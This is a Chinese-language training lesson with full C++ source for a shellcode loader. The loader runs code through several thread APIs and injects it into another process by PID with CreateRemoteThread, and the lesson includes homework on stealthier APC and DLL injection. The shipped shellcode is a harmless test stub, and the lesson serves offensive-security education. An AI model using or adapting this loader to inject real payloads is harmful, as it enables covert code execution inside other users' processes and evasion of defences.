# 课时03 - C++线程和远程线程实现ShellCode Loader

## 课程目标
1. 掌握使用CreateThread执行ShellCode
2. 理解远程线程注入的原理和实现
3. 了解线程执行的优势和应用场景
4. 实现完整的远程线程注入Loader

## 名词解释

| 术语 | 全称 | 解释 |
|------|------|------|
| CreateThread | - | 在当前进程创建新线程 |
| CreateRemoteThread | - | 在目标进程创建远程线程 |
| VirtualAllocEx | - | 在目标进程分配内存 |
| WriteProcessMemory | - | 向目标进程写入数据 |
| Thread Context | 线程上下文 | 线程的寄存器状态 |
| LPTHREAD_START_ROUTINE | - | 线程入口函数指针类型 |

## 使用工具

| 工具 | 用途 | 备注 |
|------|------|------|
| Visual Studio | 开发环境 | 支持x86/x64 |
| Process Hacker | 进程查看 | 观察注入效果 |
| x64dbg | 调试分析 | 附加目标进程调试 |

## 技术原理

### 1. 本地线程执行流程

```
┌─────────────────────────────────────┐
│  1. VirtualAlloc分配RWX内存         │
├─────────────────────────────────────┤
│  2. memcpy复制ShellCode             │
├─────────────────────────────────────┤
│  3. CreateThread创建线程             │
│     入口点 = ShellCode地址           │
├─────────────────────────────────────┤
│  4. WaitForSingleObject等待完成      │
├─────────────────────────────────────┤
│  5. GetExitCodeThread获取返回值      │
├─────────────────────────────────────┤
│  6. VirtualFree释放内存              │
└─────────────────────────────────────┘
```

### 2. 远程线程注入流程

```
┌─────────────────────────────────────┐
│  1. OpenProcess获取目标进程句柄       │
├─────────────────────────────────────┤
│  2. VirtualAllocEx在目标进程分配内存  │
├─────────────────────────────────────┤
│  3. WriteProcessMemory写入ShellCode  │
├─────────────────────────────────────┤
│  4. CreateRemoteThread创建远程线程   │
├─────────────────────────────────────┤
│  5. WaitForSingleObject等待完成      │
├─────────────────────────────────────┤
│  6. VirtualFreeEx释放远程内存        │
├─────────────────────────────────────┤
│  7. CloseHandle关闭句柄              │
└─────────────────────────────────────┘
```

## 代码实现

### 1. 本地线程Loader

```cpp
// thread_loader.cpp
// 使用线程执行ShellCode

#include <windows.h>
#include <stdio.h>

// 测试ShellCode
unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0x90,  // NOP
    0x31, 0xC0,              // xor eax, eax
    0x40,                    // inc eax
    0xC3                     // ret (返回1)
};

//=============================================================================
// 方法1: 基础CreateThread
//=============================================================================
void Method1_BasicThread() {
    printf("[*] Method 1: Basic CreateThread\n");
    
    // 分配可执行内存
    LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!mem) {
        printf("[-] VirtualAlloc failed: %lu\n", GetLastError());
        return;
    }
    
    printf("[+] Allocated memory at: %p\n", mem);
    
    // 复制ShellCode
    memcpy(mem, shellcode, sizeof(shellcode));
    
    // 创建线程
    HANDLE hThread = CreateThread(
        NULL,                           // 安全属性
        0,                              // 默认栈大小
        (LPTHREAD_START_ROUTINE)mem,    // 线程入口
        NULL,                           // 参数
        0,                              // 创建标志
        NULL                            // 线程ID
    );
    
    if (!hThread) {
        printf("[-] CreateThread failed: %lu\n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return;
    }
    
    printf("[+] Thread created, handle: %p\n", hThread);
    
    // 等待线程完成
    WaitForSingleObject(hThread, INFINITE);
    
    // 获取退出码
    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    printf("[+] Thread exit code: %lu\n", exitCode);
    
    // 清理
    CloseHandle(hThread);
    VirtualFree(mem, 0, MEM_RELEASE);
}

//=============================================================================
// 方法2: 带参数的线程
//=============================================================================
// ShellCode接收参数并返回 参数*2
unsigned char shellcode_param[] = {
    #ifdef _WIN64
    // x64: 第一个参数在RCX
    0x48, 0x8B, 0xC1,        // mov rax, rcx
    0x48, 0xD1, 0xE0,        // shl rax, 1 (乘2)
    0xC3                      // ret
    #else
    // x86: 参数在[esp+4]（线程参数）
    0x8B, 0x44, 0x24, 0x04,  // mov eax, [esp+4]
    0xD1, 0xE0,              // shl eax, 1 (乘2)
    0xC2, 0x04, 0x00         // ret 4
    #endif
};

void Method2_ThreadWithParam() {
    printf("[*] Method 2: Thread with Parameter\n");
    
    LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode_param),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!mem) return;
    
    memcpy(mem, shellcode_param, sizeof(shellcode_param));
    
    // 传递参数 (值为10)
    DWORD param = 10;
    
    HANDLE hThread = CreateThread(
        NULL, 0,
        (LPTHREAD_START_ROUTINE)mem,
        (LPVOID)(DWORD_PTR)param,       // 参数
        0, NULL
    );
    
    if (!hThread) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return;
    }
    
    WaitForSingleObject(hThread, INFINITE);
    
    DWORD exitCode;
    GetExitCodeThread(hThread, &exitCode);
    printf("[+] Input: %lu, Output: %lu (expected: %lu)\n", 
           param, exitCode, param * 2);
    
    CloseHandle(hThread);
    VirtualFree(mem, 0, MEM_RELEASE);
}

//=============================================================================
// 方法3: 挂起创建后恢复
//=============================================================================
void Method3_SuspendedThread() {
    printf("[*] Method 3: Suspended Thread\n");
    
    LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!mem) return;
    
    memcpy(mem, shellcode, sizeof(shellcode));
    
    // 创建挂起的线程
    HANDLE hThread = CreateThread(
        NULL, 0,
        (LPTHREAD_START_ROUTINE)mem,
        NULL,
        CREATE_SUSPENDED,   // 挂起创建
        NULL
    );
    
    if (!hThread) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return;
    }
    
    printf("[+] Thread created in suspended state\n");
    
    // 可以在这里修改线程上下文等
    
    // 恢复执行
    printf("[*] Resuming thread...\n");
    ResumeThread(hThread);
    
    WaitForSingleObject(hThread, INFINITE);
    
    DWORD exitCode;
    GetExitCodeThread(hThread, &exitCode);
    printf("[+] Exit code: %lu\n", exitCode);
    
    CloseHandle(hThread);
    VirtualFree(mem, 0, MEM_RELEASE);
}

//=============================================================================
// 方法4: 使用线程池
//=============================================================================
void CALLBACK ThreadPoolCallback(
    PTP_CALLBACK_INSTANCE Instance,
    PVOID Context,
    PTP_WORK Work)
{
    printf("[+] Thread pool callback executing\n");
    
    typedef int (*SC_FUNC)();
    SC_FUNC func = (SC_FUNC)Context;
    int result = func();
    
    printf("[+] ShellCode returned: %d\n", result);
}

void Method4_ThreadPool() {
    printf("[*] Method 4: Thread Pool\n");
    
    LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!mem) return;
    
    memcpy(mem, shellcode, sizeof(shellcode));
    
    // 创建工作项
    PTP_WORK work = CreateThreadpoolWork(
        ThreadPoolCallback,
        mem,
        NULL
    );
    
    if (!work) {
        printf("[-] CreateThreadpoolWork failed\n");
        VirtualFree(mem, 0, MEM_RELEASE);
        return;
    }
    
    // 提交工作
    SubmitThreadpoolWork(work);
    
    // 等待完成
    WaitForThreadpoolWorkCallbacks(work, FALSE);
    
    // 清理
    CloseThreadpoolWork(work);
    VirtualFree(mem, 0, MEM_RELEASE);
}

//=============================================================================
// 方法5: 远程线程注入
//=============================================================================
BOOL InjectToProcess(DWORD pid, const void* shellcode, SIZE_T size) {
    printf("[*] Method 5: Remote Thread Injection to PID %lu\n", pid);
    
    // 打开目标进程
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | 
        PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE,
        pid
    );
    
    if (!hProcess) {
        printf("[-] OpenProcess failed: %lu\n", GetLastError());
        return FALSE;
    }
    
    printf("[+] Opened process handle: %p\n", hProcess);
    
    // 在目标进程分配内存
    LPVOID remoteMem = VirtualAllocEx(
        hProcess,
        NULL,
        size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!remoteMem) {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }
    
    printf("[+] Allocated remote memory at: %p\n", remoteMem);
    
    // 写入ShellCode
    SIZE_T written;
    if (!WriteProcessMemory(hProcess, remoteMem, shellcode, size, &written)) {
        printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    printf("[+] Written %zu bytes\n", written);
    
    // 创建远程线程
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remoteMem,
        NULL,
        0,
        NULL
    );
    
    if (!hThread) {
        printf("[-] CreateRemoteThread failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    printf("[+] Remote thread created: %p\n", hThread);
    
    // 等待完成
    WaitForSingleObject(hThread, INFINITE);
    
    DWORD exitCode;
    GetExitCodeThread(hThread, &exitCode);
    printf("[+] Remote thread exit code: %lu\n", exitCode);
    
    // 清理
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return TRUE;
}

//=============================================================================
// 方法6: NtCreateThreadEx (更隐蔽)
//=============================================================================
typedef NTSTATUS (NTAPI* PFN_NTCREATETHREADEX)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

void Method6_NtCreateThreadEx() {
    printf("[*] Method 6: NtCreateThreadEx\n");
    
    // 获取函数地址
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PFN_NTCREATETHREADEX pNtCreateThreadEx = 
        (PFN_NTCREATETHREADEX)GetProcAddress(hNtdll, "NtCreateThreadEx");
    
    if (!pNtCreateThreadEx) {
        printf("[-] NtCreateThreadEx not found\n");
        return;
    }
    
    LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!mem) return;
    
    memcpy(mem, shellcode, sizeof(shellcode));
    
    HANDLE hThread = NULL;
    NTSTATUS status = pNtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        mem,
        NULL,
        0,      // 不挂起
        0,
        0,
        0,
        NULL
    );
    
    if (hThread) {
        printf("[+] Thread created via NtCreateThreadEx\n");
        WaitForSingleObject(hThread, INFINITE);
        
        DWORD exitCode;
        GetExitCodeThread(hThread, &exitCode);
        printf("[+] Exit code: %lu\n", exitCode);
        
        CloseHandle(hThread);
    } else {
        printf("[-] NtCreateThreadEx failed: 0x%08X\n", status);
    }
    
    VirtualFree(mem, 0, MEM_RELEASE);
}

//=============================================================================
// 方法7: 使用RtlCreateUserThread
//=============================================================================
typedef NTSTATUS (NTAPI* PFN_RTLCREATEUSERTHREAD)(
    HANDLE ProcessHandle,
    PSECURITY_DESCRIPTOR SecurityDescriptor,
    BOOLEAN CreateSuspended,
    ULONG StackZeroBits,
    PULONG StackReserved,
    PULONG StackCommit,
    PVOID StartAddress,
    PVOID StartParameter,
    PHANDLE ThreadHandle,
    PVOID ClientId
);

void Method7_RtlCreateUserThread() {
    printf("[*] Method 7: RtlCreateUserThread\n");
    
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PFN_RTLCREATEUSERTHREAD pRtlCreateUserThread = 
        (PFN_RTLCREATEUSERTHREAD)GetProcAddress(hNtdll, "RtlCreateUserThread");
    
    if (!pRtlCreateUserThread) {
        printf("[-] RtlCreateUserThread not found\n");
        return;
    }
    
    LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!mem) return;
    
    memcpy(mem, shellcode, sizeof(shellcode));
    
    HANDLE hThread = NULL;
    NTSTATUS status = pRtlCreateUserThread(
        GetCurrentProcess(),
        NULL,
        FALSE,      // 不挂起
        0,
        NULL,
        NULL,
        mem,
        NULL,
        &hThread,
        NULL
    );
    
    if (hThread) {
        printf("[+] Thread created via RtlCreateUserThread\n");
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
    
    VirtualFree(mem, 0, MEM_RELEASE);
}

//=============================================================================
// 查找进程
//=============================================================================
#include <tlhelp32.h>

DWORD FindProcessByName(const wchar_t* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe.th32ProcessID;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    
    CloseHandle(hSnapshot);
    return 0;
}

//=============================================================================
// 主函数
//=============================================================================
int main(int argc, char* argv[]) {
    printf("========================================\n");
    printf("  Thread ShellCode Loader              \n");
    printf("========================================\n\n");
    
    // 本地线程方法
    Method1_BasicThread();
    printf("\n");
    
    Method2_ThreadWithParam();
    printf("\n");
    
    Method3_SuspendedThread();
    printf("\n");
    
    Method4_ThreadPool();
    printf("\n");
    
    Method6_NtCreateThreadEx();
    printf("\n");
    
    Method7_RtlCreateUserThread();
    printf("\n");
    
    // 远程注入 (需要管理员权限和目标PID)
    if (argc >= 2) {
        DWORD targetPid = atoi(argv[1]);
        printf("[*] Remote injection to PID: %lu\n", targetPid);
        InjectToProcess(targetPid, shellcode, sizeof(shellcode));
    } else {
        printf("[*] Usage: %s <target_pid> for remote injection\n", argv[0]);
    }
    
    printf("\n[*] Done.\n");
    return 0;
}
```

## 课后作业

### 作业1：实现进程名注入
扩展程序，支持通过进程名而不是PID进行注入。

### 作业2：添加DLL注入
结合远程线程技术，实现DLL注入功能。

### 作业3：实现隐蔽注入
使用NtCreateThreadEx的挂起+APC方式实现更隐蔽的注入。
